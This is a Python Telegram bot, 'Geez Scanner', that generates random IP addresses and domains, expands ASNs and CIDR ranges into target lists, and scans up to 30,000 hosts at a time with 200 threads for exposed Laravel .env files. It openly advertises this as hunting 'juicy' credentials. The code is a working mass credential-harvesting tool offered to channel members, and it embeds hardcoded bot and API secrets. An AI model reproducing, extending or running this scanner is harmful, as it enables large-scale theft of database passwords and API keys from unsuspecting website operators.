from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import *
import os, io, threading, time
from utils import *


CHANNEL_USERNAME = "GeezClub" 
CHANNEL_ID = -1001835588870
DEV_USER_ID = "WolfiexD"


domains = []
words = []


with open("domains.txt", "r") as f:
    domains = f.read().split("\n")

with open("words.txt", "r") as f:
    words = f.read().split("\n")


MAX_IPV4_IP_GEN_LIMIT = 30000
MAX_IPV6_IP_GEN_LIMIT = 30000
MAX_DOMAIN_GEN_LIMIT = 30000
MAX_SCAN_LIMIT = 5
MAX_URLS_SCAN_LIMIT = 30000
SCAN_THREADS_LIMIT = 200
MAX_CIDR_TO_IP = 30


SCAN_DIC = {}

BOT_TOKEN = os.environ.get("TOKEN", "6629243995:AAFA39-H_ZtRBDlboQwF0mNlnEtsu23phs8")
API_ID = int(os.environ.get("API_ID", 5579463))
API_HASH = os.environ.get("API_HASH", "07c154deeab4aa60fe6f47bebc8df137")

bot = Client("GeezScanBot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

def env_check(urls, user_id):
    global SCAN_DIC
    # [".env", "vendor/.env", "lib/.env", "lab/.env",  "cronlab/.env", "cron/.env", "core/.env", "core/app/.env", "core/Database/.env", "database/.env", "config/.env", "assets/.env", "app/.env", "apps/.env", "uploads/.env", "sitemaps/.env", "site/.env", "admin/.env", "web/.env", "public/.env", "en/.env", "tools/.env", "v1/.env", "administrator/.env", "laravel/.env"]
    endpoint_list = [".env", "vendor/.env", "config/.env"]
    if True:
        for url in urls:
            for endpoint in endpoint_list:
                try:
                    if not user_id in SCAN_DIC:
                        return
                    if not url.endswith("/"):
                        url = url + "/"
                    r1 = requests.head(f"http://{url}{endpoint}", timeout=5, verify=False, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"})
                    print(f"http://{url}{endpoint}", r1.status_code)
                    if r1.status_code == 200:
                        r2 = requests.get(f"http://{url}{endpoint}", timeout=5, verify=False, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"})
                        if not user_id in SCAN_DIC:
                                return
                        if "APP_NAME=" in r2.text and "APP_ENV=" in r2.text:
                            SCAN_DIC[user_id]["list"].append(f"http://{url}{endpoint}")
                except Exception as e:
                    continue

def process_list_concurrently(input_list, num_threads, user_id, processing_function=env_check):
    global SCAN_DIC

    chunk_size = len(input_list) // num_threads
    threads = []

    def worker(chunk, user_id):
        for item in chunk:
            if user_id in SCAN_DIC:
                processing_function([item], user_id)
            else:
                    break
            
    for i in range(num_threads):
        start = i * chunk_size
        end = (i + 1) * chunk_size if i < num_threads - 1 else len(input_list)
        chunk = input_list[start:end]
        thread = threading.Thread(target=worker, args=(chunk, user_id))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


def is_in_channel(c, m):
    try:
        user = c.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=m.from_user.id)
        if user.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
            return True
        msg = f"**Dear {m.from_user.mention}, you need to join my updates channel before using me.**"
        btn = InlineKeyboardButton("Join Channel 🚀 ", url=f"https://t.me/{CHANNEL_USERNAME}")
        keyboard = InlineKeyboardMarkup([[btn]])

        m.reply_text(msg, reply_markup=keyboard)
        return False
    except Exception as e:
        #print(e)
        msg = f"**Dear {m.from_user.mention}, you need to join my updates channel before using me.**"
        btn = InlineKeyboardButton("Join Channel 🚀 ", url=f"https://t.me/{CHANNEL_USERNAME}")
        keyboard = InlineKeyboardMarkup([[btn]])
        m.reply_text(msg, reply_markup=keyboard)
        return False

@bot.on_message(filters.command("start"))
def bot_start(c, m):
    if not is_in_channel(c, m):
        return
    user_id = m.from_user.id
    msg = f"Hey {m.from_user.mention} 👋\n\n__I'm **Geez Scanner**, a bot that helps you to scan and generate IPs & Domains for **'sensitive'** or **'juicy'** credentials.__\n\nCommands: /cmds"
    
    join_channel_button = InlineKeyboardButton("Join Channel 🚀", url=f"https://t.me/{CHANNEL_USERNAME}")
    dev_button = InlineKeyboardButton("Dev", url=f"https://t.me/{DEV_USER_ID}")
    keyboard = InlineKeyboardMarkup([[join_channel_button], [dev_button]])

    m.reply_text(msg, reply_markup=keyboard)



@bot.on_message(filters.command("cmds"))
def bot_cmds(c, m):
    if not is_in_channel(c, m):
        return
    user_id = m.from_user.id 
    msg = f"Hey {m.from_user.mention} 👋\n__I'm **Geez Scanner**__\n\n⮩ **Generators**\n↳ /q - Generate Random IPv4 IPs\n↳ /p - Generate Random IPv6 IPs\n↳ /d - Generate Random Domains\n\n⮩ **Converters**\n↳ /a - ASN to CIDR Ranges\n↳ /b - CIDR Ranges to IPs\n\n⮩ **ENV Scanner**\n↳ /s - Start Scan for Laravel ENVs [Only IPv4 IPs]\n↳ /ss - Stop Laravel ENV Scan"
    btn = InlineKeyboardButton("Join Channel 🚀 ", url=f"https://t.me/{CHANNEL_USERNAME}")
    keyboard = InlineKeyboardMarkup([[btn]])
    m.reply_text(msg, reply_markup=keyboard)



@bot.on_message(filters.command("q"))
def bot_genipv4ip(c, m):
    if not is_in_channel(c, m):
        return
    text = m.text.split()
    if len(text) != 2 or not text[1].isdigit(): return m.reply_text("**Invalid Format**\n__Use__: `/q amount`")
    amt = int(text[1])
    if not 0 < amt <= MAX_IPV4_IP_GEN_LIMIT: return m.reply_text(f"**Invalid Amount. Use a value between 1 and {MAX_IPV4_IP_GEN_LIMIT}.**")

    temp_message = m.reply_text(f"`Generating {amt} IPv4 IPs...`", quote=True)
    start_time = time.time()
    s = "\n".join(generate_ipv4() for _ in range(amt))
    filename = f"{m.from_user.id}_x{amt}_IPv4.txt"
    end_time = time.time()
    time_taken = end_time - start_time

    m.reply_document(
        document=io.BytesIO(s.encode("utf-8")),
        caption=f"**Generated IPv4 Addresses**\n\n► Amount: `{amt}`\n► Requested By: {m.from_user.mention}\n► Time Taken: `{time_taken:.2f} seconds`",
        file_name=filename
    )
    temp_message.delete()




@bot.on_message(filters.command("p"))
def bot_genipv6ip(c, m):
    if not is_in_channel(c, m):
        return
    text = m.text.split()
    if len(text) != 2 or not text[1].isdigit(): return m.reply_text("**Invalid Format**\n__Use__: `/p amount`")
    amt = int(text[1])
    if not 0 < amt <= MAX_IPV6_IP_GEN_LIMIT: return m.reply_text(f"**Invalid Amount. Use a value between 1 and {MAX_IPV4_IP_GEN_LIMIT}.**")

    
    temp_message = m.reply_text(f"`Generating {amt} IPv6 IPs...`", quote=True)
    start_time = time.time()
    s = "\n".join(generate_ipv6() for _ in range(amt))
    filename = f"{m.from_user.id}_x{amt}_IPv6.txt"
    end_time = time.time()
    time_taken = end_time - start_time

    m.reply_document(
        document=io.BytesIO(s.encode("utf-8")),
        caption=f"**Generated IPv6 Addresses**\n\n► Amount: `{amt}`\n► Requested By: {m.from_user.mention}\n► Time Taken: `{time_taken:.2f} seconds`",
        file_name=filename
    )
    temp_message.delete()

@bot.on_message(filters.command("d"))
def bot_gendomains(c, m):
    if not is_in_channel(c, m):
        return
    text = m.text.split()
    if len(text) != 2 or not text[1].isdigit(): return m.reply_text("**Invalid Format**\n__Use__: `/d amount`")
    amt = int(text[1])
    if not 0 < amt <= MAX_DOMAIN_GEN_LIMIT: return m.reply_text(f"**Invalid Amount. Use a value between 1 and {MAX_DOMAIN_GEN_LIMIT}.**")

    
    temp_message = m.reply_text(f"`Generating {amt} Domains...`", quote=True)
    start_time = time.time()
    s = "\n".join(random_domain_name(words, domains) for _ in range(amt))
    filename = f"{m.from_user.id}_x{amt}_Domains.txt"
    end_time = time.time()
    time_taken = end_time - start_time

    m.reply_document(
        document=io.BytesIO(s.encode("utf-8")),
        caption=f"**Generated Domains**\n\n► Amount: `{amt}`\n► Requested By: {m.from_user.mention}\n► Time Taken: `{time_taken:.2f} seconds`",
        file_name=filename
    )
    temp_message.delete()


@bot.on_message(filters.command("ip"))
def bot_ipinfo(c, m):
    if not is_in_channel(c, m):
        return
    text = m.text
    ips = extract_ips(text)
    if len(ips) < 1:
        return m.reply_text("**No IP/s Found.**\n__Use__: `/ip IP`")
    ip = ips[0]
    ip_info = ip_information(ip)
    if ip_info.get("error"):
        return m.reply_text("**" + ip_info.get("error") + "**")

    formatted_info = '\n'.join(
        f"► __**{str(key).replace('_', ' ').capitalize()}**: `{str(value)}`__"
        for key, value in ip_info.items() if value not in [None, '', 'None']
    )

    m.reply_text(f'**IP Information**\n\n{formatted_info}')


@bot.on_message(filters.command("s"))
def bot_envscan(c, m):
    if not is_in_channel(c, m):
        return
    user_id = m.from_user.id
    if len(SCAN_DIC) > MAX_SCAN_LIMIT:
        return m.reply_text(f"**More than {(MAX_SCAN_LIMIT)} are active, try again after some time.")
    if m.from_user.id in SCAN_DIC:
        return m.reply_text("**You cannot run more than 1 scan simultaneously.**")      
    if m.reply_to_message and m.reply_to_message.document:
        try:
            document = m.reply_to_message.document
            file_message = c.get_messages(m.chat.id, message_ids=m.reply_to_message.id)
            
            if file_message.document:
                k = m.reply_text("`Downloading...`")
                file_path = file_message.download()
                
                with open(file_path, 'rb') as file:
                    file_content = file.read().decode('utf-8')
                
                urls = extract_ips(file_content)
                k.delete()
                l = len(urls)
                if l > MAX_URLS_SCAN_LIMIT or l < 1:
                    return m.reply_text(f"**Invalid Amount of IPs/URLs, can only scan between 1 & {str(MAX_URLS_SCAN_LIMIT)}**")
                j = m.reply_text(f"**Laravel ENV Scan**\n\n► **Amount**: `{str(l)}`\n► **Status**: `Running`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `N/A seconds`")

                SCAN_DIC[m.from_user.id] = {
                    "list": [],
                    "isScanning": True,
                    "start_time": time.time()
                }
                
                process_list_concurrently(urls, SCAN_THREADS_LIMIT, m.from_user.id)
                
                if not m.from_user.id in SCAN_DIC:
                    return

                end_time = time.time()
                time_taken = end_time - SCAN_DIC[m.from_user.id]["start_time"]
                
                if len(SCAN_DIC[m.from_user.id]["list"]) < 1:
                    SCAN_DIC.pop(m.from_user.id)
                    j.delete()
                    return m.reply_text(f"**Laravel ENV Scan Results**\n\n► **Amount**: `{str(l)}`\n► **Found**: `0`\n► **Requested By**: {m.from_user.mention}\n► Time Taken: `{time_taken:.2f} seconds`")
                
                totalFound = 0
                s = ''
                for ok in SCAN_DIC[m.from_user.id]["list"]:
                    s = s + ok + "\n"
                    totalFound = totalFound + 1
               
                filename = f"ENV Scan Results - {str(m.from_user.id)}.txt"
                
                m.reply_document(
                    document=io.BytesIO(s.encode("utf-8")),
                    caption=f"**Laravel ENV Scan Results**\n\n► **Amount**: `{str(l)}`\n► **Found**: `{str(totalFound)}`\n► **Status**: `Completed`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `{time_taken:.2f} seconds`",
                    file_name=filename
                )
                j.delete()
                SCAN_DIC.pop(m.from_user.id)
            else:
                return m.reply_text("**No ENVs Found.**")

        except Exception as e:
            return m.reply_text("Internal Server Error: " + str(e))

    else:
        return m.reply_text("**Please reply to a document.**")


@bot.on_message(filters.command("ss"))
def bot_envscanstop(c, m):
    if not is_in_channel(c, m):
        return
    if len(SCAN_DIC) < 1:
        return m.reply_text(f"**No Scans are currently being done.**")
    if not m.from_user.id in SCAN_DIC:
        return m.reply_text("**You have not started any scan yet.**")
    if len(SCAN_DIC[m.from_user.id]["list"])>0:
        s = ""
        totalFound = 0
        for ok in SCAN_DIC[m.from_user.id]["list"]:
            s = s + ok + "\n"
            totalFound = totalFound + 1
               
            filename = f"ENV Scan Results - {str(m.from_user.id)}.txt"
            end_time = time.time()
            time_taken = end_time - SCAN_DIC[m.from_user.id]["start_time"]
                
            m.reply_document(
                document=io.BytesIO(s.encode("utf-8")),
                caption=f"**Laravel ENV Scan Results**\n\n► **Amount**: `{str(l)}`\n► **Found**: `{str(totalFound)}`\n► **Status**: `Completed`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `{time_taken:.2f} seconds`",
                file_name=filename
                )
    SCAN_DIC.pop(m.from_user.id)
    m.reply_text("**Stopped Scanning.**")
          


@bot.on_message(filters.command("a"))
def bot_asntocidr(c, m):
    if not is_in_channel(c, m):
        return
    user_id = m.from_user.id
    text = m.text 
    asn = None
    k = m.reply_text("`Please wait...`")
    try:
        start_time = time.time()
        asn = find_asn(text)
        if len(asn)<1 or not is_valid_asn(int(asn[0])):
            k.delete()
            return m.reply_text("**Please provide a valid ASN.**")
        asn = asn[0]
        x = asn_to_cidr(asn)
        if len(x)<1:
            k.delete()
            return m.reply_text("**No information available for the provided asn**")
        s=''
        for i in x:
            s+=i+"\n"
        filename = f"ASN To CIDR Results - {str(m.from_user.id)}.txt"
        end_time = time.time()
        time_taken = end_time - start_time
                
        m.reply_document(
            document=io.BytesIO(s.encode("utf-8")),
            caption=f"**ASN To CIDR Ranges**\n\n► **Found**: `{str(len(x))}`\n► **Status**: `Completed`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `{time_taken:.2f} seconds`",
            file_name=filename
            )
        k.delete()
    except Exception as e:
        e = str(e).replace("mxtoolbox.com", "xxxxxx.com")
        k.delete()
        return m.reply_text(f"**Internal Server Error**: `{e}`")

@bot.on_message(filters.command("b"))
def bot_cidrtoips(c, m):
    if not is_in_channel(c, m):
        return
    user_id = m.from_user.id
    if len(SCAN_DIC) > MAX_SCAN_LIMIT:
        return m.reply_text(f"**More than {(MAX_SCAN_LIMIT)} scans are active, try again after some time.")
    if m.from_user.id in SCAN_DIC:
        return m.reply_text("**You cannot run more than 1 scan simultaneously.**")      
    if m.reply_to_message and m.reply_to_message.document:
        try:
            document = m.reply_to_message.document
            file_message = c.get_messages(m.chat.id, message_ids=m.reply_to_message.id)
            
            if file_message.document:
                start_time = time.time()
                k = m.reply_text("`Downloading...`")
                file_path = file_message.download()
                
                with open(file_path, 'rb') as file:
                    file_content = file.read().decode('utf-8')

                cidrs = find_cidr(file_content)
                
                k.delete()
                
                if len(cidrs)<1:
                    return m.reply_text("**No Valid CIDR Ranges found.**")
                if len(cidrs)>MAX_CIDR_TO_IP:
                    return m.reply_text(f"**Invalid Amount of CIDRs, can only convert between 1 & {str(MAX_CIDR_TO_IP)}**") 
                j = m.reply_text(f"**CIDR Ranges to IPs**\n\n► **Amount**: `{str(len(cidrs))}`\n► **Status**: `Running`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `N/A seconds`")
                 
                total_ips = 0
                for k, cidr in enumerate(cidrs, start=1):
                    ips = cidr_to_ip(cidr)

                    if not ips:
                        continue

                    total_ips += len(ips)
                    filename = f"CIDR IPs Part {str(k)} - {str(user_id)}.txt"

                    m.reply_document(
                        document=io.BytesIO("\n".join(ips).encode("utf-8")),
                        caption=f"**CIDR IPs Part {str(k)}**",
                        file_name=filename
                    )
                end_time = time.time()
                time_taken = end_time - start_time
                j.delete()
                m.reply_text(f"**ASN To CIDR Ranges**\n\n► **Found**: `{str(totalIPS)}`\n► **Status**: `Completed`\n► **Requested By**: {m.from_user.mention}\n► **Time Taken**: `{time_taken:.2f} seconds`")

            else:
                return m.reply_text("**Please reply to a document.**")

        except Exception as e:
            return m.reply_text("Internal Server Error: " + str(e))

    else:
        return m.reply_text("**Please reply to a document.**")  


bot.run()
